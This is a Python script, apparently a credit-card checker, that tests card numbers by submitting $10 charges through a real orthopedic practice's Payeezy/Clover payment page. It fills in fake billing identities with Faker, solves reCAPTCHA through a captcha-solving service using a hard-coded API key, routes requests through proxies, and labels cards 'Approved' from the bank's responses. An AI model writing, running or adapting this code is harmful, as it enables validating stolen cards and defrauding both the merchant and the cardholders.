import aiohttp
from aiohttp import ClientSession
from faker import Faker
import capsolver
import asyncio
from functions.functions import ProxyRandom3

CAPSOLVER_KEY = "CAP-5D246BDACA192D1EAC3F1494BE61BA77"
SITE_KEY = "6LfBt9wmAAAAAFlQ5-gfCfZNq4OfsDjgam-BI73y"

fake = Faker()
first_name = fake.first_name()
last_name = fake.last_name()
address = fake.address().replace("\n", " ")
city = fake.city()
state = fake.state()
zip_code = fake.zipcode()


class CaptchaSolver:
    @staticmethod
    async def Solverv2(sitekey: str, url: str) -> str:
        try:
            capsolver.api_key = CAPSOLVER_KEY

            loop = asyncio.get_event_loop()
            solution = await loop.run_in_executor(
                None,
                lambda: capsolver.solve({
                    "type": "ReCaptchaV2TaskProxyLess",
                    "websiteURL": url,
                    "websiteKey": sitekey,
                })
            )
            captcha = solution["gRecaptchaResponse"]

            return captcha
        except Exception as e:
            return str(e)


async def payeezy(cc, mes, ano, cvv, proxyg):
    retries = 0
    max_retries = 3
    while retries <= max_retries:
        try:
            async with ClientSession() as session:
                headers = {
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                    "accept-language": "es-419,es;q=0.9",
                    "cache-control": "max-age=0",
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": "https://daytonorthopedicsurgery.com",
                    "priority": "u=0, i",
                    "referer": "https://daytonorthopedicsurgery.com/make-a-payment/",
                    "sec-ch-ua": '"Not)A;Brand";v="99", "Brave";v="127", "Chromium";v="127"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                    "sec-fetch-dest": "document",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-user": "?1",
                    "sec-gpc": "1",
                    "upgrade-insecure-requests": "1",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, como Gecko) Chrome/127.0.0.0 Safari/537.36",
                }

                data = [
                    ("mode2", "pay"),
                    ("x_currency_code", "USD"),
                    ("x_invoice_num_name", ""),
                    ("x_first_name", first_name),
                    ("x_last_name", last_name),
                    ("x_company", ""),
                    ("x_address", address),
                    ("x_city", city),
                    ("x_state", state),
                    ("x_zip", zip_code),
                    ("x_country", "United States"),
                    ("x_invoice_num", ""),
                    ("x_invoice_num_name", ""),
                    ("x_po_num", ""),
                    ("x_po_num_name", ""),
                    ("x_reference_3", ""),
                    ("x_reference_3_name", ""),
                    ("x_user1", ""),
                    ("x_user1_name", ""),
                    ("x_user2", ""),
                    ("x_user2_name", ""),
                    ("x_user3", ""),
                    ("x_user3_name", ""),
                    ("x_email", ""),
                    ("x_email_name", ""),
                    ("x_phone", ""),
                    ("x_phone_name", ""),
                    ("x_description", ""),
                    ("x_description_name", ""),
                    ("x_amount", "10"),
                ]

                response = await session.post(
                    "https://daytonorthopedicsurgery.com/payeezy-endpoint/",
                    headers=headers,
                    data=data,
                    proxy=proxyg,  # Se usa el proxy pasado como argumento
                )
                response_text = await response.text()

                # El resto de la función permanece sin cambios
                def extract_value(text, key):
                    try:
                        return text.split(f'name="{key}" value="')[1].split('"')[0]
                    except IndexError:
                        return "No disponible"

                xlogin = extract_value(response_text, "x_login")
                xsecuence = extract_value(response_text, "x_fp_sequence")
                xtimestap = extract_value(response_text, "x_fp_timestamp")
                xhash = extract_value(response_text, "x_fp_hash")
                xinvoice = extract_value(response_text, "x_invoice_num")
                xlineitem = extract_value(response_text, "x_line_item")

                headers = {
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "accept-language": "es-ES,es;q=0.9,en;q=0.8",
                    "cache-control": "max-age=0",
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": "https://daytonorthopedicsurgery.com",
                    "priority": "u=0, i",
                    "referer": "https://daytonorthopedicsurgery.com/",
                    "sec-ch-ua": '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                    "sec-fetch-dest": "document",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-site": "cross-site",
                    "upgrade-insecure-requests": "1",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, como Gecko) Chrome/127.0.0.0 Safari/537.36",
                }

                data = {
                    "x_login": xlogin,
                    "x_amount": "10.00",
                    "x_fp_sequence": xsecuence,
                    "x_fp_timestamp": xtimestap,
                    "x_fp_hash": xhash,
                    "x_currency_code": "USD",
                    "x_first_name": "Sebastian",
                    "x_last_name": "Gutierrez",
                    "x_address": "103-105 Central Avenue",
                    "x_city": "Orange",
                    "x_state": "New Jersey",
                    "x_country": "United States",
                    "x_zip": "07050-3824",
                    "x_line_item": xlineitem,
                    "x_invoice_num": xinvoice,
                    "x_type": "AUTH_CAPTURE",
                    "x_show_form": "PAYMENT_FORM",
                }

                response = await session.post(
                    "https://checkout.globalgatewaye4.firstdata.com/payment",
                    headers=headers,
                    data=data,
                )

                headers = {
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "Accept-Language": "es-ES,es;q=0.9,en;q=0.8",
                    "Connection": "keep-alive",
                    "Content-Type": "application/json; charset=UTF-8",
                    "HCOrequestSource": "CloverHCO",
                    "Origin": "https://www.clover.com",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-origin",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, como Gecko) Chrome/127.0.0.0 Safari/537.36",
                    "X-Requested-With": "XMLHttpRequest",
                    "sec-ch-ua": '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                }

                recaptcha_token = await CaptchaSolver.Solverv2(
                    SITE_KEY, "https://checkout.globalgatewaye4.firstdata.com/payment"
                )

                if recaptcha_token:
                    json_data = {
                        "cc_expiry": f"{mes}{ano[2:]}",
                        "cardholder_name": first_name,
                        "cc_number": cc,
                        "customerEmail": "",
                        "paymentType": "creditCard",
                        "customerFirstName": first_name,
                        "customerLastName": last_name,
                        "tax1_amount": "",
                        "customer_ref": "",
                        "zip": zip_code,
                        "password": "",
                        "transaction_type": "00",
                        "xlogin": xlogin,
                        "gateway_id": "",
                        "split_tender_id": "",
                        "language": "en",
                        "hashKey": xhash,
                        "amount": "10.00",
                        "recurringPlanId": "",
                        "recurringPlanName": "",
                        "recurringAmount": "",
                        "recurringActive": "",
                        "recurringInterval": "",
                        "recurringIntervalCount": "",
                        "recurringMerchantId": "",
                        "recurringDeveloperAppId": "",
                        "recurringSubscriptionCount": "",
                        "recurringActiveSubscriptionCount": "",
                        "recurringStartDate": "",
                        "recurringEndDate": "",
                        "recaptchaToken": recaptcha_token,
                        "address": {
                            "address1": address,
                            "city": city,
                            "state": state,
                            "country_code": "United States",
                            "zip": zip_code,
                        },
                        "cvd_presence_indicator": "9",
                    }

                    response = await session.post(
                        "https://www.clover.com/payeezyhcoapp/transaction/v1",
                        headers=headers,
                        json=json_data,
                    )
                    print(response.text)
                    msg = await response.text()
                    try:
                        exact_message = msg.split('"exact_message":"')[1].split('"')[0]
                    except IndexError:
                        exact_message = "No disponible"

                    try:
                        bank_message = msg.split('"bank_message":"')[1].split('"')[0]
                    except IndexError:
                        bank_message = "No disponible"

                    try:
                        avs = msg.split('"avs":"')[1].split('"')[0]
                    except IndexError:
                        avs = "No disponible"

                    if "Approved" in bank_message:
                        status = "Approved ✅"
                    elif "CVV2/VAK Failure" in bank_message:
                        status = "Approved ✅"
                    elif "Insufficient Funds" in bank_message:
                        status = "Approved ✅"
                    elif "Address not Verified" in msg:
                        status = "Approved "
                    else:
                        status = "Declined ❌"

                    if "No disponible" in [exact_message, bank_message, avs]:
                        retries += 1
                        continue

                    return exact_message, avs, bank_message, status
        except Exception as e:
            retries += 1
            if retries > max_retries:
                return "Error después de reintentos", "No disponible", "No disponible", "Declined ❌"
